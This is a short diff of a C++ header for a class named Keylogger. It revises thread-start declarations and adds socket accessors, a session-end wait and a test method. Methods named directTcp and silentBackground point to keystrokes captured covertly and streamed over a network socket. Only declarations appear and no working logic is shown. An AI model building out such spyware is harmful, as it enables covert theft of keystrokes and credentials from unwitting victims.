@@ -10,7 +10,6 @@ class Keylogger
 {
     public:
 
-        Keylogger();
         Keylogger(SOCKET &sock);
         //-----------------------------------------------
         VOID setup();
@@ -18,13 +17,21 @@ class Keylogger
         wstring specialKey(INT &keystroke);
         wstring intToUnicode(INT keystroke);
         //-----------------------------------------------
-        static VOID WINAPI StaticThreadStart(); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
-        VOID startThread();
-         VOID WINAPI directTcp();
+        static DWORD WINAPI StaticThreadStart(void* param);
+        HANDLE startThread(); //starts a thread of the directTCp method and returns are HANDLE
+        struct PARAMETERS; //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
+        VOID directTcp();
+        //-----------------------------------------------
+        VOID waitingEndSession(HANDLE &thread_to_finish);//waits to receive an end-of-connection message  for directTcp
+        //-----------------------------------------------
         VOID silentBackground();
         //-----------------------------------------------
+        SOCKET getSocket();
+        //-----------------------------------------------
+        VOID test();
         ~Keylogger();
         
+        SOCKET public_sock;
     private:
         SOCKET a_sock;
 
